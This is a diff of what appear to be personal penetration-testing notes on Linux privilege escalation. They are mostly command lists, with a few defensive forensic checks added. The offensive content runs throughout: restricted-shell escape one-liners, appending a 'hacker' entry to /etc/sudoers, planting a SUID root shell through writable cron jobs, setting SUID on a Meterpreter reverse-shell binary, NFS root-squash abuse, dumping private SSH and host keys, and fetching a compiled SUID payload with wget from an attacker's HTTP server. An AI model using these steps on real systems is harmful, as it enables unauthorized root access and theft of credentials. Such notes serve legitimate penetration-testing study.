@@ -62,96 +62,6 @@ http://securebean.blogspot.ca/2014/05/escaping-restricted-shell_3.html
 
 https://blog.netspi.com/attacking-restricted-linux-shells/
 
-### escape shell commands
-
-python -c 'import pty;pty.spawn("/bin/bash")'
-
-echo os.system('/bin/bash')
-
-/bin/sh -i
-
-#### Go from rbash to bash
-
-1.	find a file that you can write and execute to 
-
-2.	find the tee file
-
-3.	watch the quotes in the command below.
-
-4.	echo '/bin/bash';|tee -a './bin/ping'
-
-5.	echo the bin/bash shell into the ping tool and execute the ping tool
-
-6.	basically you are appending the bin/bash to ping tool and executing
-
-7.	cd /home
-
-8.	now we are bash
-
-#### try to root the server tricks
-
-https://www.youtube.com/watch?v=SoUrcesP9ek
-
-1.	we have to set the path for bash first
-
-2.	export PATH=*dollar-sign*PATH:/usr/bin/
-
-2.	no we need to search cron job, to see if anything I found is vulnerable
-
-3.	cd /etc/cron.minutely/
-
-4.	ls
-
-5.	check all running cron jobs
-
-6.	ls -ls file
-
-7.	you need to write if not try other things
-
-8.	cat file
-
-9.	see if file is running other files
-
-10.	check permissions on other files
-
-10.	hopefully they are running as 777
-
-11.	appended things to other files
-
-12.	nano file
-
-13.	do things like cp /bin/sh /home/restricted1/unkownendevice64 && chmod 4755
-
-14.	give you root privs to run this shell
-
-
-### Setting the SUID sticky bit
-
-chmod 777 lin86-reverse-met-603.elf
-
-chmod +x lin86-reverse-met-603.elf
-
-chmod 4777 lin86-reverse-met-603.elf
-
-#### Privilege escalation
-
-Now we start the whole enumeration-process over gain.
-
-- Kernel exploits
-- Programs running as root
-- Installed software
-- Weak/reused/plaintext passwords
-- Inside service
-- Suid misconfiguration
-- World writable scripts invoked by root
-- Unmounted filesystems
-
-Less likely
-
-- Private ssh keys
-- Bad path configuration
-- Cronjobs
-
 
 ### Useful commands
 
@@ -161,6 +71,13 @@ Less likely
 su root
 ```
 
+###
+
+check user access to sudo
+
+```
+sudo -l
+```
 
 ####  Spawning shell
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -207,13 +124,6 @@ python linprivchecker.py extended
 ./unix-privesc-check standard
 
 
-### Writable directories
-
-/tmp
-
-/var/tmp
-
-
 ### Add user to sudoers
 
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
@@ -227,6 +137,29 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoer
 wait some time and keep checking the file size of sudoers
 
 then sudo su
+
+
+#### Privilege escalation
+
+Now we start the whole enumeration-process over gain.
+
+- Kernel exploits
+- Programs running as root
+- Installed software
+- Weak/reused/plaintext passwords
+- Inside service
+- Suid misconfiguration
+- World writable scripts invoked by root
+- Unmounted filesystems
+
+Less likely
+
+- Private ssh keys
+- Bad path configuration
+- Cronjobs
+
+
+
 
 ### Basic info
 
@@ -282,6 +215,34 @@ pwd
 
 cat /etc/passwd
 
+#### look in /etc/passwd for new accounts in sorted list by UID
+
+sort -nk3 -t: /etc/passwd | less
+
+#### look for unexpected UID 0 accounts
+
+egrep ':0+:' /etc/passwd
+
+#### look for UID 0 accounts on a system with multiple authentications
+
+getent passwd | egrep ':0+:'
+
+#### look for orphaned files which could be a sign and attacker left something behind
+
+find / -nouser -print 2>/dev/null
+
+#### look at uptime
+
+uptime
+
+#### exssive memory use 
+
+free
+
+#### disk space
+
+df
+
 ### Users with login
 
 grep -vE "nologin" /etc/passwd
@@ -293,6 +254,18 @@ grep -vE "nologin|false" /etc/passwd
 ps aux
 
 netstat -antup
+
+#### if you spot a process that is unfamiliar, investigate in more detail using 
+
+lsof -p [pid]
+
+#### get details about running processes listening
+
+lsof -i
+
+#### check which services are enabled at various runlevels
+
+chkconfig --list
 
 #### What's installed? What kernel is being used?
 
@@ -349,6 +322,9 @@ ls -alh /var/cache/yum/
 
 #### What jobs are scheduled?
 
+
+crontab -u root -l
+
 crontab -l
 
 ls -alh /var/spool/cron
@@ -368,6 +344,8 @@ cat /etc/cron.allow
 cat /etc/cron.deny
 
 cat /etc/crontab
+
+cat /etc/crontab.*
 
 cat /etc/anacrontab
 
@@ -412,6 +390,8 @@ cat /etc/hosts
 ### What files run as root / SUID / GUID?:
 
 ```
+find / -uid 0 -perm -4000 -print
+
 find / -perm +2000 -user root -type f -print
 
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
@@ -444,49 +424,24 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & exe
 
 ```
 
+#### look for unusual large files (greater than 10 Megabytes)
 
+find / -size + 10000k -print
 
-### LINUX Privilege escalation
+#### look for files named with dots and spaces ("...","..","." and " ")
 
-Linux Privilege Escalation
+find / -name " " -print
+find / -name ".. " -print
+find / -name ". " -print
+find / -name " " -print
 
-https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+#### look for processes running out of or accessing files that have been unlinked
 
-https://www.youtube.com/watch?v=dk2wsyFiosg
+lsof +L1
 
-### Priv Enumeration Scripts
+on linux with rpm installed
 
-#### Privilege escalation recon scripts:
-
-http://www.securitysift.com/download/linuxprivchecker.py
-
-http://pentestmonkey.net/tools/audit/unix-privesc-check
-
-
-
-upload /unix-privesc-check
-
-upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
-
-upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
-
-python linprivchecker.py extended
-
-./LinEnum.sh -t -k password
-
-unix-privesc-check
-
-
-
-### Kernel exploits
-
-```
-site:exploit-db.com kernel version
-
-perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
-
-python linprivchecker.py extended
-```
+rpm -Va | sort
 
 ### Programs running as root
 
@@ -564,6 +519,131 @@ nano
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+### Unmounted filesystems
+
+Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
+
+```
+mount -l
+
+
+```
+
+### Look for NFS shares and try to mount them
+
+
+```
+root@kali:~# mkdir /tmp/nfs
+root@kali:~# mount -t nfs *target*:/home/user /tmp/nfs
+root@kali:~# cd /tmp/nfs
+
+```
+### mount access denied root squashing
+
+https://en.wikipedia.org/wiki/Unix_security#Root_squash
+
+http://fullyautolinux.blogspot.ca/2015/11/nfs-norootsquash-and-suid-basic-nfs.html
+
+Pro Tip
+
+If you have the UID and GID of a user on the server. we can create a user on our local machine with the UID 2008 and try accessing the mounted share 
+
+```
+execute sudoedit /etc/exports as root. we can disable root squashing. We can do so by replacing root_squash with no_root_squash.
+
+```
+### umount nfs shares
+
+```
+Unmount /tmp/nfs
+```
+
+
+### Cronjob
+
+Look for anything that is owned by privileged user but writable for you
+
+```
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
+
+### SSH Keys
+
+Check all home directories
+
+```
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+```
+
+### think about generating ssh keys on the local machine and uploading to the server
+
+### Priv Enumeration Scripts
+
+#### Privilege escalation recon scripts:
+
+http://www.securitysift.com/download/linuxprivchecker.py
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+upload /unix-privesc-check
+
+upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
+
+upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
+
+python linprivchecker.py extended
+
+./LinEnum.sh -t -k password
+
+unix-privesc-check
+
+
+### LINUX Privilege escalation
+
+Linux Privilege Escalation
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+https://www.youtube.com/watch?v=dk2wsyFiosg
+
+
+### Kernel exploits
+
+GET THE KERNAL VERSION AND SEARCH FOR PRIV ESC EXPLOITS 
+
+```
+site:exploit-db.com kernel version
+
+perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
+
+python linprivchecker.py extended
+```
+
 
 
 ### SUID (Set owner User ID up on execution)
@@ -613,7 +693,8 @@ suid.c:3:5: warning: implicit declaration of function ‘system’ [-Wimplicit-f
      ^~~~~~
 root@kali:~/Desktop/B2R# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
-john@Kioptrix4:/tmp$ wget http://192.168.1.13:8000/suid
+
+wget http://192.168.1.13:8000/suid
 ```
 
 
@@ -661,54 +742,6 @@ cat /etc/passwd
 
 su kate
 
-### Unmounted filesystems
-
-Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
-
-```
-mount -l
-```
-
-### Cronjob
-
-Look for anything that is owned by privileged user but writable for you
-
-```
-crontab -l
-ls -alh /var/spool/cron
-ls -al /etc/ | grep cron
-ls -al /etc/cron*
-cat /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-cat /etc/cron.allow
-cat /etc/cron.deny
-cat /etc/crontab
-cat /etc/anacrontab
-cat /var/spool/cron/crontabs/root
-```
-
-### SSH Keys
-
-Check all home directories
-
-```
-cat ~/.ssh/authorized_keys
-cat ~/.ssh/identity.pub
-cat ~/.ssh/identity
-cat ~/.ssh/id_rsa.pub
-cat ~/.ssh/id_rsa
-cat ~/.ssh/id_dsa.pub
-cat ~/.ssh/id_dsa
-cat /etc/ssh/ssh_config
-cat /etc/ssh/sshd_config
-cat /etc/ssh/ssh_host_dsa_key.pub
-cat /etc/ssh/ssh_host_dsa_key
-cat /etc/ssh/ssh_host_rsa_key.pub
-cat /etc/ssh/ssh_host_rsa_key
-cat /etc/ssh/ssh_host_key.pub
-cat /etc/ssh/ssh_host_key
-```
 
 
 ### Bad path configuration
@@ -746,7 +779,76 @@ Located in viperhome/application/modules/post
 
 viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitation Scripts/
 
+### escape shell commands
 
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+#### Go from rbash to bash
+
+1.	find a file that you can write and execute to 
+
+2.	find the tee file
+
+3.	watch the quotes in the command below.
+
+4.	echo '/bin/bash';|tee -a './bin/ping'
+
+5.	echo the bin/bash shell into the ping tool and execute the ping tool
+
+6.	basically you are appending the bin/bash to ping tool and executing
+
+7.	cd /home
+
+8.	now we are bash
+
+#### try to root the server tricks
+
+https://www.youtube.com/watch?v=SoUrcesP9ek
+
+1.	we have to set the path for bash first
+
+2.	export PATH=*dollar-sign*PATH:/usr/bin/
+
+2.	no we need to search cron job, to see if anything I found is vulnerable
+
+3.	cd /etc/cron.minutely/
+
+4.	ls
+
+5.	check all running cron jobs
+
+6.	ls -ls file
+
+7.	you need to write if not try other things
+
+8.	cat file
+
+9.	see if file is running other files
+
+10.	check permissions on other files
+
+10.	hopefully they are running as 777
+
+11.	appended things to other files
+
+12.	nano file
+
+13.	do things like cp /bin/sh /home/restricted1/unkownendevice64 && chmod 4755
+
+14.	give you root privs to run this shell
+
+
+### Setting the SUID sticky bit
+
+chmod 4755 lin86-reverse-met-603.elf
+
+chmod s+x lin86-reverse-met-603.elf
+
+chmod 4777 lin86-reverse-met-603.elf
 ------------------------------------------------------------------------
 
 ----------------------------- LOOT LOOT LOOT LOOT ----------------------
